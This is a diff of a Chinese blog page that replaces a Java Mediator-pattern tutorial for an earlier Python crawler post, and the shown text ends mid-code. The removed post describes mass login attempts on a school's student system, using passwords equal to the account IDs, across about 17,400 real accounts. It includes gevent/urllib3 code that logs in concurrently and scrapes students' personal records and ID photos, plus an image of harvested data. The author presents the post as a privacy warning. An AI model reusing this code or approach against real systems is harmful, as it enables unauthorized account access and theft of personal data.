@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="爬虫,Python," />
+  <meta name="keywords" content="Java,设计模式," />
 
 
 
@@ -81,26 +81,18 @@
 
 
 
-<meta name="description" content="初衷本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！">
-<meta name="keywords" content="爬虫,Python">
+<meta name="description" content="本文实例代码：https://github.com/JamesZBL/java_design_patterns 中介者（Mediator）模式是用来降低多个对象和类之间的通信复杂性的。这种模式中通常提供一个充当中介者角色的类，用来承担“中心化”或“集中化”的职能，与各个对象之间都可以分别相互通信，它的一大优势是减少或避免其他对象之间的互相通信，在通信方面降低了耦合度。 实例现在要举行一场派对，派对">
+<meta name="keywords" content="Java,设计模式">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Python 第一个爬虫-教务系统信息收集">
-<meta property="og:url" content="https://james.letec.top/2018/02/24/Python 第一个爬虫-教务系统信息收集/index.html">
+<meta property="og:title" content="设计模式学习笔记（13）中介者">
+<meta property="og:url" content="https://james.letec.top/2018/05/13/设计模式学习笔记（13）中介者/index.html">
 <meta property="og:site_name" content="郑保乐的博客">
-<meta property="og:description" content="初衷本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！">
+<meta property="og:description" content="本文实例代码：https://github.com/JamesZBL/java_design_patterns 中介者（Mediator）模式是用来降低多个对象和类之间的通信复杂性的。这种模式中通常提供一个充当中介者角色的类，用来承担“中心化”或“集中化”的职能，与各个对象之间都可以分别相互通信，它的一大优势是减少或避免其他对象之间的互相通信，在通信方面降低了耦合度。 实例现在要举行一场派对，派对">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-03-29T14:31:11.022Z">
+<meta property="og:updated_time" content="2018-05-13T08:12:17.019Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Python 第一个爬虫-教务系统信息收集">
-<meta name="twitter:description" content="初衷本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！">
-<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta name="twitter:title" content="设计模式学习笔记（13）中介者">
+<meta name="twitter:description" content="本文实例代码：https://github.com/JamesZBL/java_design_patterns 中介者（Mediator）模式是用来降低多个对象和类之间的通信复杂性的。这种模式中通常提供一个充当中介者角色的类，用来承担“中心化”或“集中化”的职能，与各个对象之间都可以分别相互通信，它的一大优势是减少或避免其他对象之间的互相通信，在通信方面降低了耦合度。 实例现在要举行一场派对，派对">
 
 
 
@@ -130,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://james.letec.top/2018/02/24/Python 第一个爬虫-教务系统信息收集/"/>
+  <link rel="canonical" href="https://james.letec.top/2018/05/13/设计模式学习笔记（13）中介者/"/>
 
 
 
 
 
-  <title>Python 第一个爬虫-教务系统信息收集 | 郑保乐的博客</title>
+  <title>设计模式学习笔记（13）中介者 | 郑保乐的博客</title>
   
 
 
@@ -321,7 +313,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://james.letec.top/2018/02/24/Python 第一个爬虫-教务系统信息收集/">
+    <link itemprop="mainEntityOfPage" href="https://james.letec.top/2018/05/13/设计模式学习笔记（13）中介者/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="郑保乐">
@@ -338,7 +330,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">Python 第一个爬虫-教务系统信息收集</h2>
+          <h2 class="post-title" itemprop="name headline">设计模式学习笔记（13）中介者</h2>
         
 
         <div class="post-meta">
@@ -350,8 +342,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-24T09:25:00+08:00">
-                2018-02-24
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-13T14:20:00+08:00">
+                2018-05-13
               </time>
             
 
@@ -373,8 +365,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/爬虫/" itemprop="url" rel="index">
-                    <span itemprop="name">爬虫</span>
+                  <a href="/categories/设计模式/" itemprop="url" rel="index">
+                    <span itemprop="name">设计模式</span>
                   </a>
                 </span>
 
@@ -392,8 +384,8 @@
                 <i class="fa fa-comment-o"></i>
               </span>
               
-                <a href="/2018/02/24/Python 第一个爬虫-教务系统信息收集/#SOHUCS" itemprop="discussionUrl">
-                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="2018/02/24/Python 第一个爬虫-教务系统信息收集/" itemprop="commentsCount"></span>
+                <a href="/2018/05/13/设计模式学习笔记（13）中介者/#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="2018/05/13/设计模式学习笔记（13）中介者/" itemprop="commentsCount"></span>
                 </a>
               
             
@@ -401,7 +393,7 @@
 
           
           
-             <span id="/2018/02/24/Python 第一个爬虫-教务系统信息收集/" class="leancloud_visitors" data-flag-title="Python 第一个爬虫-教务系统信息收集">
+             <span id="/2018/05/13/设计模式学习笔记（13）中介者/" class="leancloud_visitors" data-flag-title="设计模式学习笔记（13）中介者">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -426,7 +418,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,661 字
+                  1,124 字
                 </span>
               
 
@@ -442,7 +434,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  7 分钟
+                  5 分钟
                 </span>
               
             </div>
@@ -463,110 +455,32 @@
       
 
       
-        <h2 id="初衷"><a href="#初衷" class="headerlink" title="初衷"></a>初衷</h2><p><strong>本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！</strong><br><a id="more"></a><br>作者所在学校的教务系统安全防范措施可谓非常不严密，学生登录甚至不需要图形验证码。每年学生入学之后，学校下发的账号，初始密码不是无规律的，而是和账号完全一致！如果学生不及时修改密码，那么其他人可以轻松登录他的账号。登录后可以看到学生的学籍信息，包括高考报名时照片，家长联系方式等，联系地址甚至详细到几单元几楼几号门，<strong>个人信息泄露情况非常严重！</strong></p>
-<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>先说结果。经过两天连写带调试，终于完成了对全校本科生 17400 多个在网账号的测试，其中有 12600 多个账号使用的还是初始密码。此处隐去校名，统计结果如下：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">序号</th>
-<th style="text-align:center">学院</th>
-<th style="text-align:center">年级</th>
-<th style="text-align:center">在网账号</th>
-<th style="text-align:center">可爬账号</th>
-<th style="text-align:center">年级占比</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">1</td>
-<td style="text-align:center">本一</td>
-<td style="text-align:center">2014</td>
-<td style="text-align:center">3157</td>
-<td style="text-align:center">1998</td>
-<td style="text-align:center">63.29%</td>
-</tr>
-<tr>
-<td style="text-align:center">2</td>
-<td style="text-align:center">本一</td>
-<td style="text-align:center">2015</td>
-<td style="text-align:center">3328</td>
-<td style="text-align:center">2234</td>
-<td style="text-align:center">67.13%</td>
-</tr>
-<tr>
-<td style="text-align:center">3</td>
-<td style="text-align:center">本一</td>
-<td style="text-align:center">2016</td>
-<td style="text-align:center">3641</td>
-<td style="text-align:center">3066</td>
-<td style="text-align:center">84.21%</td>
-</tr>
-<tr>
-<td style="text-align:center">4</td>
-<td style="text-align:center">本一</td>
-<td style="text-align:center">2017</td>
-<td style="text-align:center">3497</td>
-<td style="text-align:center">3326</td>
-<td style="text-align:center">95.11%</td>
-</tr>
-<tr>
-<td style="text-align:center">5</td>
-<td style="text-align:center">本三</td>
-<td style="text-align:center">2014</td>
-<td style="text-align:center">1759</td>
-<td style="text-align:center">303</td>
-<td style="text-align:center">17.23%</td>
-</tr>
-<tr>
-<td style="text-align:center">6</td>
-<td style="text-align:center">本三</td>
-<td style="text-align:center">2015</td>
-<td style="text-align:center">1643</td>
-<td style="text-align:center">620</td>
-<td style="text-align:center">37.74%</td>
-</tr>
-<tr>
-<td style="text-align:center">7</td>
-<td style="text-align:center">本三</td>
-<td style="text-align:center">2016</td>
-<td style="text-align:center">1605</td>
-<td style="text-align:center">1434</td>
-<td style="text-align:center">89.35%</td>
-</tr>
-<tr>
-<td style="text-align:center">8</td>
-<td style="text-align:center">本三</td>
-<td style="text-align:center">2017</td>
-<td style="text-align:center">1552</td>
-<td style="text-align:center">639</td>
-<td style="text-align:center">41.17%</td>
-</tr>
-</tbody>
-</table>
-<p><strong>介于初衷，只爬了 10 个账号的信息，以示严重性！</strong></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爬到的学籍信息"></p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>本人之前做过近 2 年的 Java 相关开发，对 HTTP 协议中常用的知识了解一些，再加上 Python 出了名的简洁易用，因此入门还是比较轻松的。去年有一段时间研究过一阵子 Python，使用的是 Scrapy 框架，所以这一次我也首先想到了 Scrapy。</p>
-<p>Scrapy 这种框架适用的情形是：已经获取了需要爬取的页面的一系列 URL ，或者 URL 是成一定规律变化的，不需要登录或者登录一次拿到 Cookie 就可以拿着这个 Cookie 一直用了。但是教务系统完全相反，它需要每次都进行登录，也许 Scrapy 有办法，但也不会太简单，索性自己写。</p>
-<p>这套教务系统虽然安全性不怎么样，但也已是一套成熟的产品了，功能和稳定性上还是很不错的。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="系统的登录界面"></p>
-<p>首先使用 Firefox 浏览器的开发者工具查看 HTTP 通信的一些信息：</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="登录请求 ( POST )"></p>
-<p>登录表单通过 POST 请求进行提交，参数是账号和密码，发送的也是明文</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="表单参数"></p>
-<p>服务器返回的响应中 Set-Cookie 就相当于给用户下发的令牌，用户下一次请求的时候带上这块令牌，服务器就能认出来这个用户是否刚登录过。这个令牌是有时间限制的，每次请求都会刷新一次时间，如果两次请求之间间隔时间超过设定值，那么服务器就不认识用户了，这次会话就结束了，需要重新登录。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="登录的响应体"></p>
-<p>刚开始使用的是 requests ，用 for 循环实现，由于 requests 是同步的，所以效率很低，还会经常卡死。后来改成了协程，用的 gevent + urllib3，效率提升了上百倍。解析 HTML 用的 lxml 的 etree，图片的保存用 PIL 的 Image。</p>
-<p>先引入依赖<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br></pre></td></tr></table></figure></p>
-<p>创建 HTTP 连接池<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http = urllib3.HTTPConnectionPool(</span><br><span class="line">    host=settings.SERVER_HOST,</span><br><span class="line">    port=settings.SERVER_PORT,</span><br><span class="line">    strict=<span class="keyword">False</span>,</span><br><span class="line">    maxsize=<span class="number">100</span>,</span><br><span class="line">    block=<span class="keyword">False</span>,</span><br><span class="line">    retries=<span class="number">100</span>,</span><br><span class="line">    timeout=<span class="number">10</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
-<p>请求头的一些固定信息可以预先设定好，伪装浏览器<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">header = &#123;<span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'Keep-alive'</span>,</span><br><span class="line">    <span class="string">'Host'</span>: settings.SERVER_HOST,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>登录并验证是否是初始密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 账号校验器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InfoValidate</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.logger = InfoMain.logger</span><br><span class="line">        self.http = InfoMain.http</span><br><span class="line">        <span class="comment"># 有效账号</span></span><br><span class="line">        self.account_valid = []</span><br><span class="line">        <span class="comment"># 可爬账号</span></span><br><span class="line">        self.account_available = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, all_account)</span>:</span></span><br><span class="line">        <span class="comment"># 将所有校验过程加入队列</span></span><br><span class="line">        jobs = [gevent.spawn(self.validate_account, self.http, a) <span class="keyword">for</span> a <span class="keyword">in</span> all_account]</span><br><span class="line">        gevent.joinall(jobs, timeout=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_account</span><span class="params">(self, http, account)</span>:</span></span><br><span class="line">        <span class="comment"># 登录请求参数</span></span><br><span class="line">        param = &#123;<span class="string">"zjh"</span>: account, <span class="string">"mm"</span>: account&#125;</span><br><span class="line">        header = headers.header</span><br><span class="line">        response = http.request(<span class="string">'POST'</span>, settings.URL_LOGIN, fields=param, headers=header)</span><br><span class="line">        self.logger.info(<span class="string">'发送请求&gt;&gt;&#123;&#125;'</span>.format(param))</span><br><span class="line">        self.logger.info(response.status)</span><br><span class="line">        <span class="comment"># 响应体解码</span></span><br><span class="line">        res_text = response.data.decode(<span class="string">'GB2312'</span>, <span class="string">'ignore'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res_text.find(<span class="string">'密码不正确'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">            <span class="comment"># 密码有误</span></span><br><span class="line">            self.account_valid.append(account)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> res_text.find(<span class="string">'证件号不存在'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">            <span class="comment"># 账号可爬</span></span><br><span class="line">            self.account_available.append(account)</span><br><span class="line">            self.account_valid.append(account)</span><br><span class="line">            self.logger.info(<span class="string">"账号可用&gt;&gt;&gt;&#123;&#125;"</span>.format(account))</span><br></pre></td></tr></table></figure></p>
-<p>至此已经获取了所有初始密码未修改的账号了，下面研究一下，要爬取的学籍信息页的规律</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="学籍信息页"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="table 的结构"></p>
-<p>一系列的信息都包裹在 <figure class="highlight plain"><figcaption><span>width </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">基于之前对账号的测试，爬取学籍信息</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"># 信息收集器</span><br><span class="line">class InfoCollect(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.logger = InfoMain.logger</span><br><span class="line">        self.http = InfoMain.http</span><br><span class="line">        # 功能模块</span><br><span class="line">        self.mod_get_roll_info = settings.MOD_ROLL_INFO</span><br><span class="line">        self.mod_get_roll_img = settings.MOD_ROLL_IMG</span><br><span class="line"></span><br><span class="line">    def get_info_queue(self, accounts):</span><br><span class="line">        # 将所有信息收集过程加入队列</span><br><span class="line">        jobs = [gevent.spawn(self.get_info, a) for a in accounts]</span><br><span class="line">        gevent.joinall(jobs, timeout=0)</span><br><span class="line"></span><br><span class="line">    def get_info(self, stuid):</span><br><span class="line">        # 登录</span><br><span class="line">        param = &#123;&apos;zjh&apos;: stuid, &apos;mm&apos;: stuid&#125;</span><br><span class="line">        response = self.http.request(&apos;POST&apos;, settings.URL_LOGIN, fields=param)</span><br><span class="line">        # 保存 Cookie</span><br><span class="line">        cookie = response.headers[&apos;Set-Cookie&apos;].replace(&apos;; path=/&apos;, &apos;&apos;)</span><br><span class="line">        header = headers.header</span><br><span class="line">        header[&apos;cookie&apos;] = cookie</span><br><span class="line">        # 学籍信息</span><br><span class="line">        if self.mod_get_roll_info:</span><br><span class="line">            # 带 Cookie 访问学籍信息页</span><br><span class="line">            response_xjxx = self.http.request(&apos;GET&apos;, settings.URL_XJXX, headers=header)</span><br><span class="line">            text = response_xjxx.data.decode(&apos;GB2312&apos;, &apos;ignore&apos;)</span><br><span class="line">            # 解析页面内容</span><br><span class="line">            selector = etree.HTML(text)</span><br><span class="line">            text_arr = selector.xpath(&apos;//td[starts-with(@width,&quot;275&quot;)]/text()&apos;)</span><br><span class="line">            # 学籍信息</span><br><span class="line">            result = []</span><br><span class="line">            for info in text_arr:</span><br><span class="line">                result.append(info.strip())</span><br><span class="line">            self.save_info(result)</span><br><span class="line">        # 学籍照片</span><br><span class="line">        if self.mod_get_roll_img:</span><br><span class="line">            response_xjzp = self.http.request(&apos;GET&apos;, settings.URL_XJZP, headers=header)</span><br><span class="line">            image = Image.open(BytesIO(response_xjzp.data))</span><br><span class="line">            setpath = settings.PATH_IMG_SAVE</span><br><span class="line">            path = pathlib.Path(setpath)</span><br><span class="line">            if not path.exists():</span><br><span class="line">                path.mkdir()</span><br><span class="line">            setpath = setpath + &apos;/&apos; + stuid + &apos;.jpg&apos;</span><br><span class="line">            image.save(setpath)</span><br><span class="line">            self.logger.info(&apos;保存照片&gt;&gt;&gt;&#123;&#125;&apos;.format(setpath))</span><br><span class="line"></span><br><span class="line">        # 登出</span><br><span class="line">        self.http.request(&apos;POST&apos;, settings.URL_LOGOUT, headers=header)</span><br></pre></td></tr></table></figure></p>
-<p>至此，已经实现了所有信息的获取以及照片的保存。</p>
-<p>没改密码的同学们应该看到了，获取个人信息其实很简单，关键在于增强自己保护个人信息的意识。</p>
-<p>相关开源项目：URP_Spider  <a href="https://github.com/JamesZBL/URP_Spider" target="_blank" rel="noopener">https://github.com/JamesZBL/URP_Spider</a></p>
+        <p>本文实例代码：<a href="https://github.com/JamesZBL/java_design_patterns" target="_blank" rel="noopener">https://github.com/JamesZBL/java_design_patterns</a></p>
+<p>中介者（Mediator）模式是用来降低多个对象和类之间的通信复杂性的。这种模式中通常提供一个充当中介者角色的类，用来承担“中心化”或“集中化”的职能，与各个对象之间都可以分别相互通信，它的一大优势是减少或避免其他对象之间的互相通信，在通信方面降低了耦合度。</p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>现在要举行一场派对，派对中会穿插各种游戏活动，凡是参加派对的人都要到派对举办者那里登记。并且，每次有参与者想要参加派对中的某个活动的时候都要先向派对举办者提出请求，由举办者来批准他的请求，然后这个活动才开始进行。</p>
+<p>先定义派对举办者行为的接口，举办者的职责有邀请成员加入和批准成员参加活动</p>
+<p>Party.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Party</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">addMember</span><span class="params">(PartyMember member)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">letAct</span><span class="params">(PartyMember member, Activity activity)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后是派对成员的接口，成员的职责有参加派对、提出参加活动的请求以及参加活动</p>
+<p>PartyMember.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PartyMember</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">joinParty</span><span class="params">(Party party)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">partyActivity</span><span class="params">(Activity activity)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">act</span><span class="params">(Activity activity)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再定义一个类来具体实现派对举办者功能</p>
+<p>PartyImpl.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PartyImpl</span> <span class="keyword">implements</span> <span class="title">Party</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> List&lt;PartyMember&gt; members;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">PartyImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    members = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addMember</span><span class="params">(PartyMember member)</span> </span>&#123;</span><br><span class="line">    members.add(member);</span><br><span class="line">    member.joinParty(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">letAct</span><span class="params">(PartyMember member, Activity activity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (PartyMember m : members) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!member.equals(m)) &#123;</span><br><span class="line">        m.partyActivity(activity);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>定义一个派对实现成员接口的抽象类，保留一个 <code>toString()</code> 抽象方法，留到其具体子类中实现</p>
+<p>AbstractPartyMember.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractPartyMember</span> <span class="keyword">implements</span> <span class="title">PartyMember</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(AbstractPartyMember.class);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> Party party;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span 